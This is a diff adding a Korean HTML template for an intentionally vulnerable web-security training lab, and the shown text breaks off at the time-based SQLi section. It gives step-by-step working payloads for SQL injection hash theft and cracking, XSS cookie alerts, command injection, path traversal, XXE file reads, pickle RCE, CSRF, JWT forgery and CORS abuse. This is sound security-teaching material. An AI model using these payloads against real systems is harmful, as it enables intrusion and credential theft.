@@ -1,0 +1,1574 @@
+{% extends 'base.html' %}
+{% block content %}
+<div class="card shadow-lg rounded-4 mb-5 section-sqli">
+    <div class="card-header py-4 px-4 d-flex align-items-center gap-3">
+        <i class="bi bi-shield-shaded fs-3" style="color:var(--c-blue)"></i>
+        <div>
+            <h3 class="mb-0 fw-bold" style="color:var(--c-blue)">Web-Security 시나리오 실습 훈련장</h3>
+            <small class="text-muted">단계별 페이로드 주입 · 완전 공격 체인 실습</small>
+        </div>
+    </div>
+    <div class="card-body p-4 p-md-5">
+        <!-- Progress Tracker -->
+        <div class="progress-tracker mb-4">
+            <div class="d-flex justify-content-between align-items-center mb-2">
+                <span class="fw-semibold" style="font-size:.9rem;"><i class="bi bi-check2-circle me-1"
+                        style="color:var(--c-blue)"></i>실습 진행도</span>
+                <span id="progressLabel" class="fw-bold" style="font-size:.85rem; color:var(--c-blue)">0 / 24 완료</span>
+            </div>
+            <div class="progress">
+                <div class="progress-bar" id="progressBar" style="width:0%"></div>
+            </div>
+        </div>
+        <!-- Category Tabs -->
+        <div class="d-flex vuln-tabs flex-wrap mb-4">
+            <button class="btn-tab active" onclick="filterVuln('all',this)">🔵 전체</button>
+            <button class="btn-tab" onclick="filterVuln('sqli',this)">💉 SQL 인젝션</button>
+            <button class="btn-tab" onclick="filterVuln('xss',this)">📜 XSS</button>
+            <button class="btn-tab" onclick="filterVuln('auth',this)">🔑 인증·세션</button>
+            <button class="btn-tab" onclick="filterVuln('file',this)">📁 파일·업로드</button>
+            <button class="btn-tab" onclick="filterVuln('adv',this)">⚡ 고급기법</button>
+        </div>
+        <p class="mb-4" style="color:var(--c-sub);">총 <strong>24가지 웹 취약점</strong> 실습 가이드입니다. 실제 페이로드를 직접 주입해 공격 체인을 완성해
+            보세요.</p>
+
+        <div class="accordion" id="vulnAccordion">
+
+            <!-- 1. SQLi -->
+            <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed fw-bold fs-5 text-primary" type="button" data-bs-toggle="collapse"
+                        data-bs-target="#vuln1" aria-expanded="false">
+                        1. SQL Injection — 완전 공격 체인 (로그인 우회 → 스키마 열거 → 해시 탈취 → 크랙)
+                    </button>
+                </h2>
+                <div id="vuln1" class="accordion-collapse collapse">
+                    <div class="accordion-body bg-body">
+                        <p class="mb-2">
+                            <strong>실습 목표:</strong> SQL Injection의 완전한 공격 체인을 단계별로 수행합니다.
+                            아무 정보 없는 상태에서 DB 구조를 파악하고, 비밀번호 해시를 탈취하여 복호화까지 완성합니다.<br>
+                            <small class="text-secondary">참고: <a
+                                    href="https://portswigger.net/web-security/sql-injection" target="_blank"
+                                    class="text-info">PortSwigger SQL Injection Academy</a> | <a
+                                    href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank"
+                                    class="text-info">OWASP SQLi</a></small>
+                        </p>
+
+                        <!-- STEP 1 -->
+                        <h6 class="fw-bold text-primary mt-4"><i class="bi bi-1-circle-fill"></i> STEP 1 — 기본 로그인 우회
+                            (Authentication Bypass)</h6>
+                        <div class="alert alert-dark font-monospace small mb-3 border border-primary border-opacity-25">
+                            <a href="https://portswigger.net/web-security/sql-injection#bypassing-login-using-sql-injection"
+                                target="_blank" class="text-info text-decoration-none fw-bold">→ Auth Bypass란?</a><br>
+                            <span class="text-primary fw-bold">입력:</span> <a href="/login" class="text-info">로그인 페이지</a>
+                            아이디에 입력 (비밀번호는 무엇이든):<br>
+                            <code class="d-block my-2 p-2 bg-black text-warning">admin' OR 1=1 -- </code>
+                            <span class="text-secondary">실제 실행 쿼리 (Telemetry 콘솔에서 확인):</span>
+                            <code class="d-block my-2 p-2 bg-black text-danger">SELECT * FROM users WHERE username = 'admin' OR 1=1 -- ' AND password = '...'
+                                                                             ↑ 항상 참  ↑ 주석 처리됨</code>
+                            <span class="text-success fw-bold">결과:</span> WHERE 조건이 항상 참 → 첫 번째 유저(admin)로 로그인 성공!
+                        </div>
+
+                        <!-- STEP 2 -->
+                        <h6 class="fw-bold text-primary mt-4"><i class="bi bi-2-circle-fill"></i> STEP 2 — 컬럼 수 파악
+                            (ORDER BY / UNION 준비)</h6>
+                        <div class="alert alert-dark font-monospace small mb-3 border border-primary border-opacity-25">
+                            <a href="https://portswigger.net/web-security/sql-injection/union-attacks" target="_blank"
+                                class="text-info text-decoration-none fw-bold">→ UNION Based 공격이란?</a><br>
+                            UNION SELECT를 쓰려면 원본 쿼리의 컬럼 수가 같아야 합니다. <code>ORDER BY</code>로 컬럼 수를 파악합니다:<br>
+                            <code class="d-block my-2 p-2 bg-black text-warning">admin' ORDER BY 1-- &nbsp; → 성공 (1컬럼 이상 존재)
+admin' ORDER BY 2-- &nbsp; → 성공 (2컬럼 이상 존재)
+admin' ORDER BY 3-- &nbsp; → 성공 (3컬럼 이상 존재)
+admin' ORDER BY 4-- &nbsp; → 에러! → 컬럼 수 = 3개 확정</code>
+                            <span class="text-success fw-bold">결론:</span> 이 쿼리는 <code>id, username, role</code> 총 3개 컬럼을
+                            반환합니다.
+                        </div>
+
+                        <!-- STEP 3 -->
+                        <h6 class="fw-bold text-primary mt-4"><i class="bi bi-3-circle-fill"></i> STEP 3 — 테이블 목록 열거
+                            (sqlite_master 활용)</h6>
+                        <div class="alert alert-dark font-monospace small mb-3 border border-primary border-opacity-25">
+                            <a href="https://portswigger.net/web-security/sql-injection/examining-the-database"
+                                target="_blank" class="text-info text-decoration-none fw-bold">→ DB 스키마 열거란?</a><br>
+                            SQLite의 시스템 테이블 <code>sqlite_master</code>에는 모든 테이블/인덱스 정보가 있습니다:<br>
+                            <code
+                                class="d-block my-2 p-2 bg-black text-warning">fake' UNION SELECT 1, group_concat(name), 3 FROM sqlite_master WHERE type='table'-- </code>
+                            <span class="text-secondary">→ 로그인 후 상단 환영 문구에 DB 테이블 목록이 출력됩니다:</span>
+                            <code
+                                class="d-block my-2 p-2 bg-black text-success">예시 결과: users,posts,sessions (콤마 구분)</code>
+                            <span class="text-success fw-bold">결론:</span> <code>users</code> 테이블이 존재함을 확인!
+                        </div>
+
+                        <!-- STEP 4 -->
+                        <h6 class="fw-bold text-primary mt-4"><i class="bi bi-4-circle-fill"></i> STEP 4 — 컬럼 이름 열거
+                            (users 테이블 구조 파악)</h6>
+                        <div class="alert alert-dark font-monospace small mb-3 border border-primary border-opacity-25">
+                            SQLite에서는 <code>PRAGMA table_info(테이블명)</code>으로 컬럼목록을 얻을 수 있습니다:<br>
+                            <code
+                                class="d-block my-2 p-2 bg-black text-warning">fake' UNION SELECT 1, group_concat(name), 3 FROM pragma_table_info('users')-- </code>
+                            <code class="d-block my-2 p-2 bg-black text-success">예시 결과: id,username,password,role</code>
+                            <span class="text-success fw-bold">결론:</span> <code>users</code> 테이블에 <code>password</code>
+                            컬럼이 존재함 확인!
+                        </div>
+
+                        <!-- STEP 5 -->
+                        <h6 class="fw-bold text-danger mt-4"><i class="bi bi-5-circle-fill"></i> STEP 5 — 관리자 MD5 해시 탈취
+                            (UNION 데이터 추출)</h6>
+                        <div class="alert alert-dark font-monospace small mb-3 border border-danger border-opacity-25">
+                            이제 테이블 이름(<code>users</code>)과 컬럼 이름(<code>password</code>)을 파악했으니 실제 데이터를 추출합니다:<br>
+                            <code
+                                class="d-block my-2 p-2 bg-black text-warning">fake_user' UNION SELECT 1, password, 3 FROM users WHERE username='admin'-- </code>
+                            <span class="text-secondary">→ 로그인 성공 후, 상단 환영 문구에 관리자의 MD5 해시가 출력됩니다:</span>
+                            <code class="d-block my-2 p-2 bg-black text-danger">0192023a7bbd73250516f069df18b500</code>
+                            <span class="text-success fw-bold">원리:</span> UNION이 원본 쿼리의 username 자리(2번째 컬럼)에 password 값을
+                            채워넣어 세션 display_name으로 반영됩니다.
+                        </div>
+
+                        <!-- STEP 6 -->
+                        <h6 class="fw-bold text-danger mt-4"><i class="bi bi-6-circle-fill"></i> STEP 6 — 해시 크래킹 (레인보우
+                            테이블 공격)</h6>
+                        <div class="alert alert-dark font-monospace small mb-0 border border-danger border-opacity-25">
+                            <a href="https://crackstation.net/" target="_blank"
+                                class="text-danger text-decoration-none fw-bold">→ CrackStation (레인보우 테이블 사이트)
+                                방문</a><br>
+                            <span class="text-danger fw-bold">Step 6-1:</span> 탈취한 32자리 해시를 복사합니다: <code
+                                class="text-warning">0192023a7bbd73250516f069df18b500</code><br>
+                            <span class="text-danger fw-bold">Step 6-2:</span> <a href="https://crackstation.net/"
+                                target="_blank">CrackStation</a>의 입력창에 붙여넣고 [Crack Hashes] 클릭<br>
+                            <span class="text-danger fw-bold">Step 6-3:</span> 결과: <code
+                                class="text-success">md5 → admin123</code> (평문 비밀번호 탈취 완료!)<br><br>
+                            <span class="text-secondary small">
+                                💡 <strong>왜 MD5가 위험한가?</strong> MD5는 1초에 수십억 번 계산 가능한 빠른 해시입니다.
+                                레인보우 테이블에 미리 계산된 해시가 있으면 즉시 역산됩니다.
+                                실제 서비스는 <a
+                                    href="https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html"
+                                    target="_blank" class="text-info">bcrypt / Argon2</a> 같은 느린 KDF를 사용해야 합니다.
+                            </span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 2. XSS -->
+            <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed fw-bold fs-5 text-success" type="button"
+                        data-bs-toggle="collapse" data-bs-target="#vuln2">
+                        2. Stored XSS (크로스 사이트 스크립팅)
+                    </button>
+                </h2>
+                <div id="vuln2" class="accordion-collapse collapse">
+                    <div class="accordion-body bg-body">
+                        <p class="mb-2"><strong>실습 목표:</strong> 게시판에 악성 자바스크립트를 영구적으로 저장하여 다른 사용자의 브라우저 권한을 탈취합니다.</p>
+                        <div class="alert alert-dark font-monospace small mb-0 border border-success border-opacity-25">
+                            <span class="text-success fw-bold">Step 1:</span> <a href="/post/write"
+                                class="text-info">자유게시판 글쓰기</a>로 이동합니다. (로그인 필수)<br>
+                            <span class="text-success fw-bold">Step 2:</span> 내용 입력란에
+                            <code>&lt;script&gt;alert('XSS 공격 성공! 쿠키: ' + document.cookie);&lt;/script&gt;</code> 입력 후
+                            작성 버튼 클릭.<br>
+                            <span class="text-success fw-bold">Step 3:</span> 해당 게시글 열람 시 경고창이 뜨며 해커의 스트립트가 실행되는 것을
+                            확인합니다.
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 3. File Upload -->
+            <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed fw-bold fs-5 text-success" type="button"
+                        data-bs-toggle="collapse" data-bs-target="#vuln3">
+                        3. 불충분한 파일 업로드 (Web Shell)
+                    </button>
+                </h2>
+                <div id="vuln3" class="accordion-collapse collapse">
+                    <div class="accordion-body bg-body">
+                        <p class="mb-2"><strong>실습 목표:</strong> 악성 스크립트(.py 또는 .html 등)를 서버에 업로드하여 임의 코드를 실행시킵니다.</p>
+                        <div class="alert alert-dark font-monospace small mb-0 border border-success border-opacity-25">
+                            <span class="text-success fw-bold">Step 1:</span> 바탕화면에 <code>shell.html</code> 파일을 생성하고
+                            <code>&lt;h1&gt;Hacked By Myname&lt;/h1&gt;</code>과 같은 텍스트 작성.<br>
+                            <span class="text-success fw-bold">Step 2:</span> <a href="/post/write" class="text-info">새
+                                글 쓰기</a> 메뉴에서 첨부파일 폼을 통해 확장자 검증 없이 파일을 올립니다.<br>
+                            <span class="text-success fw-bold">Step 3:</span> 메인 화면에서 첨부파일
+                            링크(<code>/uploads/shell.html</code>)를 타고 들어가 파일이 렌더링되는지 확인합니다.
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 4. SSRF & Open Redirect -->
+            <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed fw-bold fs-5 text-info" type="button"
+                        data-bs-toggle="collapse" data-bs-target="#vuln4">
+                        4. SSRF (Server-Side Request Forgery) & Redirect
+                    </button>
+                </h2>
+                <div id="vuln4" class="accordion-collapse collapse">
+                    <div class="accordion-body bg-body">
+                        <p class="mb-2"><strong>실습 목표:</strong> 외부 링크 미리보기 도구를 악용해 서버 내부망(Localhost)의 정보를 탐색 및 탈취합니다.
+                        </p>
+                        <div class="alert alert-dark font-monospace small mb-0 border border-info border-opacity-25">
+                            <span class="text-info fw-bold">Step 1:</span> <a href="/url" class="text-info">URL 미리보기
+                                도구</a>로 이동합니다.<br>
+                            <span class="text-info fw-bold">Step 2:</span> 안전한 네이버 주소 대신 로컬호스트 타겟인
+                            <code>http://127.0.0.1:5000/admin</code> 입력 후 제출.<br>
+                            <span class="text-info fw-bold">Step 3:</span> 서버가 관리자 페이지를 대신 읽어와 응답(미리보기) 화면에 노출시키는 결과를
+                            관측합니다!
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 5. Command Injection -->
+            <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed fw-bold fs-5 bg-dark text-white" type="button"
+                        data-bs-toggle="collapse" data-bs-target="#vuln5">
+                        5. OS Command Injection (운영체제 명령어 삽입)
+                    </button>
+                </h2>
+                <div id="vuln5" class="accordion-collapse collapse">
+                    <div class="accordion-body bg-body align-items-center">
+                        <p class="mb-2"><strong>실습 목표:</strong> 네트워크 핑 툴(Ping)의 파라미터에 파이프오퍼레이터를 연계하여 운영체제 터미널 명령어를
+                            실행합니다.</p>
+                        <div class="alert alert-dark font-monospace small mb-0 border border-secondary">
+                            <span class="text-white fw-bold">Step 1:</span> <a href="/ping" class="text-info">서버 진단
+                                도구(Ping)</a>로 이동합니다.<br>
+                            <span class="text-white fw-bold">Step 2:</span> IP 입력란에 <code>127.0.0.1 & dir</code> (또는
+                            <code>& whoami</code>) 를 입력하세요.<br>
+                            <span class="text-white fw-bold">Step 3:</span> Ping 실행 결과 우측과 하단에 서버 호스트 PC의 실제 디렉터리 목록이
+                            고스란히 유출됩니다!
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 6. Path Traversal -->
+            <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed fw-bold fs-5 text-secondary" type="button"
+                        data-bs-toggle="collapse" data-bs-target="#vuln6">
+                        6. Directory Traversal (파일 다운로드 취약점)
+                    </button>
+                </h2>
+                <div id="vuln6" class="accordion-collapse collapse">
+                    <div class="accordion-body bg-body">
+                        <p class="mb-2"><strong>실습 목표:</strong> 다운로드 경로를 조작하여 정상 허용 디렉터리를 벗어나 핵심 서버 소스코드를 탈취해냅니다.</p>
+                        <div
+                            class="alert alert-dark font-monospace small mb-0 border border-secondary border-opacity-50">
+                            <span class="text-secondary fw-bold">Step 1:</span> <a href="/download" class="text-info">카페
+                                자료실 다운로드</a> 창으로 진입합니다.<br>
+                            <span class="text-secondary fw-bold">Step 2:</span> URL 파라미터를 강제로 변조해
+                            <code>/download?file=../../run.py</code> (루트로 올라가기) 형태로 수정하세요.<br>
+                            <span class="text-secondary fw-bold">Step 3:</span> 메인 서버 파이썬 실행 코드가 그대로 클라이언트에 다운로드됩니다.
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 7. CSRF -->
+            <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed fw-bold fs-5 text-danger" type="button"
+                        data-bs-toggle="collapse" data-bs-target="#vuln7">
+                        7. CSRF (크로스 사이트 요청 위조)
+                    </button>
+                </h2>
+                <div id="vuln7" class="accordion-collapse collapse">
+                    <div class="accordion-body bg-body">
+                        <p class="mb-2"><strong>실습 목표:</strong> 관리자 또는 임의 유저가 모르는 사이에 비밀번호를 강제로 변경되게 하는 악의적인 위조 요청 링크를
+                            생성합니다.</p>
+                        <div class="alert alert-dark font-monospace small mb-0 border border-danger border-opacity-25">
+                            <span class="text-danger fw-bold">Step 1:</span> <a href="/change_pw" class="text-info">암호
+                                변경 페이지</a> 확인. CSRF 방어 토큰이 없으며 GET 요청도 허용됩니다.<br>
+                            <span class="text-danger fw-bold">Step 2:</span>
+                            <code>&lt;img src="/change_pw?new_pw=hacked123" style="width:0; height:0;"&gt;</code> 와 같은
+                            스니펫을 준비합니다.<br>
+                            <span class="text-danger fw-bold">Step 3:</span> 자유게시판 본문에 이를 삽입하면(XSS 취약점 활용), 게시물을 읽는 즉시
+                            비밀번호가 `hacked123`으로 변경됩니다!
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 8. IDOR -->
+            <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed fw-bold fs-5 text-primary" type="button"
+                        data-bs-toggle="collapse" data-bs-target="#vuln8">
+                        8. IDOR (취약한 접근제어 / 파라미터 변조)
+                    </button>
+                </h2>
+                <div id="vuln8" class="accordion-collapse collapse">
+                    <div class="accordion-body bg-body">
+                        <p class="mb-2"><strong>실습 목표:</strong> 다른 사용자의 고유 번호(User ID)를 예측 및 파라미터를 변조하여 타인의 계정을 열람합니다.
+                        </p>
+                        <div class="alert alert-dark font-monospace small mb-0 border border-primary border-opacity-25">
+                            <span class="text-primary fw-bold">Step 1:</span> 우측 상단 드롭다운에서 '내 프로필 보기'를 클릭합니다. URL이
+                            <code>/profile?user_id=2</code> 형태로 나타납니다.<br>
+                            <span class="text-primary fw-bold">Step 2:</span> 권한 검사가 없으므로 숫자 파라미터를
+                            <code>user_id=1</code> (관리자 번호)로 직접 변경 뒤 엔터를 누릅니다.<br>
+                            <span class="text-primary fw-bold">Step 3:</span> 타 계정의 세부 정보 파일이 인증절차 없이 열람됩니다!
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 9. Cookie Auth Bypass -->
+            <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed fw-bold fs-5 text-warning" type="button"
+                        data-bs-toggle="collapse" data-bs-target="#vuln9">
+                        9. 접근통제 우회 (Cookie Bypass)
+                    </button>
+                </h2>
+                <div id="vuln9" class="accordion-collapse collapse">
+                    <div class="accordion-body bg-body">
+                        <p class="mb-2"><strong>실습 목표:</strong> 클라이언트 브라우저의 조작 가능한 쿠키 값을 로컬에서 변경함으로써 백엔드의 인가 통제를 우회합니다.
+                        </p>
+                        <div class="alert alert-dark font-monospace small mb-0 border border-warning border-opacity-25">
+                            <span class="text-warning fw-bold">Step 1:</span> 크롬에서 F12(개발자 도구) > Application(애플리케이션) 탭 >
+                            Cookies 메뉴를 엽니다.<br>
+                            <span class="text-warning fw-bold">Step 2:</span> <code>role</code> 이라는 이름의 쿠키 값을 더블클릭하여
+                            <code>user</code>에서 <code>admin</code>으로 수정합니다.<br>
+                            <span class="text-warning fw-bold">Step 3:</span> 이후 <a href="/admin"
+                                class="text-info">/admin 전용 페이지</a>로 링크 직접 접속하면 접근이 승인됩니다!
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 10. JWT Weak Secret -->
+            <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed fw-bold fs-5 text-warning bg-black" type="button"
+                        data-bs-toggle="collapse" data-bs-target="#vuln10">
+                        10. [심화] JWT 탈취 및 서명 위조 (Weak Secret Key)
+                    </button>
+                </h2>
+                <div id="vuln10" class="accordion-collapse collapse">
+                    <div class="accordion-body bg-body text-light bg-dark"
+                        style="background-color: #2b3035 !important;">
+                        <p class="mb-2"><strong>실습 목표:</strong> 발급된 JWT 토큰의 형편없는 Secret Key를 크래킹 툴로 복호화하여 내용을 임의로 위조합니다.
+                        </p>
+                        <div class="alert alert-dark font-monospace small mb-0 border border-warning">
+                            <span class="text-warning fw-bold">Step 1:</span> 로그인 시 발급되는 <code>jwt_token</code> 쿠키 값을
+                            복사하여 jwt.io 사이트에서 디코딩 구조를 확인합니다.<br>
+                            <span class="text-warning fw-bold">Step 2:</span> 시크릿키가 단순한 문자열 조합
+                            <code>blackout-secret-key</code>임으로, 이를 기반으로 페이로드 내용(role:'admin')을 재생산하여 새로운 토큰 서명을
+                            발행합니다.<br>
+                            <span class="text-warning fw-bold">Step 3:</span> 쿠키에 생성한 새 토큰을 덮어씌운채 관리자 페이지(/admin)를
+                            뚫어냅니다!
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 11. XXE -->
+            <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed fw-bold fs-5 text-warning bg-black" type="button"
+                        data-bs-toggle="collapse" data-bs-target="#vuln11">
+                        11. [심화] XXE (XML External Entity)
+                    </button>
+                </h2>
+                <div id="vuln11" class="accordion-collapse collapse">
+                    <div class="accordion-body bg-body text-light bg-dark"
+                        style="background-color: #2b3035 !important;">
+                        <p class="mb-2"><strong>실습 목표:</strong> 악성 XML을 구문 분석하게 유도하여 내부 파일 정보 및 네트워크망 요청을 탈취합니다.</p>
+                        <div class="alert alert-dark font-monospace small mb-0 border border-warning">
+                            <span class="text-warning fw-bold">Step 1:</span> Postman 앱이나 cURL을 활용해
+                            <code>/api/import</code> 주소로 POST 요청을 준비합니다.<br>
+                            <span class="text-warning fw-bold">Step 2:</span> Body에
+                            <code>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"&gt; ]&gt; &lt;root&gt;&amp;xxe;&lt;/root&gt;</code>
+                            입력.<br>
+                            <span class="text-warning fw-bold">Step 3:</span> API가 XML을 해석하며 Win.ini (또는 /etc/passwd) 등
+                            호스트 운영체제 로컬 파일을 읽고 JSON으로 반환하는 XXE 타격을 입힙니다.
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 12. Insecure Deserialization -->
+            <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed fw-bold fs-5 text-warning bg-black" type="button"
+                        data-bs-toggle="collapse" data-bs-target="#vuln12">
+                        12. [심화] Insecure Deserialization (안전하지 않은 역직렬화)
+                    </button>
+                </h2>
+                <div id="vuln12" class="accordion-collapse collapse">
+                    <div class="accordion-body bg-body text-light bg-dark"
+                        style="background-color: #2b3035 !important;">
+                        <p class="mb-2"><strong>실습 목표:</strong> <code>pickle</code> 직렬화 된 데이터를 해커가 조작해, 복원 과정 중 원격 코드
+                            실행(RCE) 상태를 발생시킵니다.</p>
+                        <div class="alert alert-dark font-monospace small mb-0 border border-warning">
+                            <span class="text-warning fw-bold">Step 1:</span> 파이썬에서 <code>__reduce__</code> 매직 메서드를 이용해
+                            <code>os.system('calc.exe')</code>를 호출하는 페이로드 클래스를 생성 & 직렬화 & Base64 인코딩.<br>
+                            <span class="text-warning fw-bold">Step 2:</span> <code>/api/config</code> 엔드포인트에
+                            <code>data</code> 명의 POST 폼 파라미터로 해당 인코딩 문자열을 날립니다.<br>
+                            <span class="text-warning fw-bold">Step 3:</span> 서버 파이썬 구동 환경이 이를 파싱 과정에서 무조건적으로 역직렬화함으로써
+                            백그라운드 악의적 명령이 자동 실행됩니다.
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 13. CORS Misconfig -->
+            <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed fw-bold fs-5 text-warning bg-black" type="button"
+                        data-bs-toggle="collapse" data-bs-target="#vuln13">
+                        13. [심화] CORS (Cross-Origin Resource Sharing) 설정 오류
+                    </button>
+                </h2>
+                <div id="vuln13" class="accordion-collapse collapse">
+                    <div class="accordion-body bg-body text-light bg-dark"
+                        style="background-color: #2b3035 !important;">
+                        <p class="mb-2"><strong>실습 목표:</strong> 악의적인 서드파티 웹사이트를 개설해, 접속한 인증 피해자로부터 민감한 API를 비동기 호출해
+                            빼냅니다.</p>
+                        <div class="alert alert-dark font-monospace small mb-0 border border-warning">
+                            <span class="text-warning fw-bold">Step 1:</span> 자신이 통제 가능한 웹 서버(임의의 HTML)에
+                            <code>fetch('http://127.0.0.1:5000/api/user_data', {credentials: 'include'})</code> 스크립트 코드를
+                            삽입합니다.<br>
+                            <span class="text-warning fw-bold">Step 2:</span> 관리자 역할을 지닌 사용자가 해당 타사 페이지에 접속하면, 브라우저가
+                            자동으로 쿠키를 태워 취약점 서버로 요청을 보냅니다.<br>
+                            <span class="text-warning fw-bold">Step 3:</span> `Access-Control-Allow-Origin: *` 결함으로 인해
+                            응답(민감 데이터)이 차단되지 않고 그대로 해커 콘솔에 출력됩니다.
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div> <!-- /accordion -->
+    </div>
+</div>
+
+<!-- Phase 4 Expanded Labs -->
+<div class="card shadow-lg border-0 rounded-4 mb-5 border-danger border-opacity-25 mt-4">
+    <div class="card-header py-4 px-4 d-flex align-items-center"
+        style="background:rgba(243,139,168,0.1); border-bottom:1px solid rgba(243,139,168,0.3);">
+        <i class="bi bi-fire fs-3 me-3 text-danger"></i>
+        <h4 class="mb-0 fw-bold text-danger">심화 SQL Injection 기법 & 신규 취약점 모듈</h4>
+    </div>
+    <div class="card-body p-4 p-md-5">
+        <div class="accordion" id="advAccordion">
+
+            <!-- A: Error-Based SQLi -->
+            <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed fw-bold fs-5 text-danger" type="button"
+                        data-bs-toggle="collapse" data-bs-target="#advA">
+                        A. Error-Based SQL Injection (에러 기반 데이터 추출)
+                    </button>
+                </h2>
+                <div id="advA" class="accordion-collapse collapse">
+                    <div class="accordion-body bg-body">
+                        <p class="mb-2"><strong>실습 목표:</strong> DB 에러 메시지를 강제로 발생시켜 쿼리 구조나 데이터를 직접 읽어냅니다. 이 앱은 예외 메시지를
+                            화면에 그대로 렌더링합니다.<br>
+                            <small class="text-secondary"><a
+                                    href="https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors"
+                                    target="_blank" class="text-info">PortSwigger: Error-Based Lab</a> | <a
+                                    href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank"
+                                    class="text-info">OWASP</a></small>
+                        </p>
+                        <div class="alert alert-dark font-monospace small mb-3 border border-danger border-opacity-25">
+                            <span class="text-danger fw-bold">Step 1:</span> 로그인 페이지에서 아이디에 작은따옴표 하나만 입력해보세요:
+                            <code>'</code><br>
+                            <span class="text-danger fw-bold">Step 2:</span> DB가 구문 오류를 상세하게 노출시킵니다 —
+                            "sqlite3.OperationalError: unrecognized token" 형태의 서버 내부 정보를 확인합니다.<br>
+                            <span class="text-danger fw-bold">Step 3:</span>
+                            <code>' AND 1=CAST((SELECT username FROM users LIMIT 1) AS INTEGER)--</code> 처럼 타입 변환 오류를
+                            유도해 실제 데이터를 뽑아냅니다.
+                        </div>
+                        <h6 class="fw-bold text-danger">💡 원리 설명</h6>
+                        <code class="d-block p-3 bg-black text-warning mb-2">WHERE username = ''' AND password = '...'
+→ sqlite3.OperationalError: near "AND": syntax error</code>
+                        <p class="small text-secondary">DB가 에러를 내부적으로 처리하지 않고 Python 예외로 흘러나오면 공격자는 이를 쿼리 탐색 수단으로 활용합니다.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- B: Blind SQLi -->
+            <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed fw-bold fs-5 text-danger" type="button"
+                        data-bs-toggle="collapse" data-bs-target="#advB">
+                        B. Blind SQL Injection (참/거짓 기반 데이터 추출)
+                    </button>
+                </h2>
+                <div id="advB" class="accordion-collapse collapse">
+                    <div class="accordion-body bg-body">
+                        <p class="mb-2"><strong>실습 목표:</strong> 에러가 없어도 응답의 성공/실패 차이만으로 DB 내용을 한 글자씩 추출합니다.<br>
+                            <small class="text-secondary"><a
+                                    href="https://portswigger.net/web-security/sql-injection/blind" target="_blank"
+                                    class="text-info">PortSwigger: Blind SQLi</a> | <a
+                                    href="https://github.com/sqlmapproject/sqlmap" target="_blank"
+                                    class="text-info">sqlmap (자동화 도구)</a></small>
+                        </p>
+                        <div class="alert alert-dark font-monospace small mb-3 border border-danger border-opacity-25">
+                            <span class="text-danger fw-bold">Step 1:</span> 이 페이로드로 로그인 시도:
+                            <code>admin' AND SUBSTR(password,1,1)='0'-- </code><br>
+                            <span class="text-danger fw-bold">Step 2:</span> 로그인 성공 = 첫 글자가 '0', 실패 = 아님. 문자를 a~f, 0~9로
+                            바꿔가며 반복합니다.<br>
+                            <span class="text-danger fw-bold">Step 3:</span> 32회 반복하면 MD5 해시 전체를 수동으로 추출할 수 있습니다. (실전에서는
+                            <code>sqlmap</code> 같은 도구가 자동화합니다.)
+                        </div>
+                        <code class="d-block p-3 bg-black text-success mb-2">-- 참/거짓 예시
+admin' AND SUBSTR(password,1,1)='0'--   → 로그인 성공 (참)
+admin' AND SUBSTR(password,1,1)='1'--   → 실패 (거짓)
+admin' AND LENGTH(password)=32--        → 해시 길이 확인</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- C: Time-Based Blind SQLi -->
+            <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed fw-bold fs-5 text-danger" type="button"
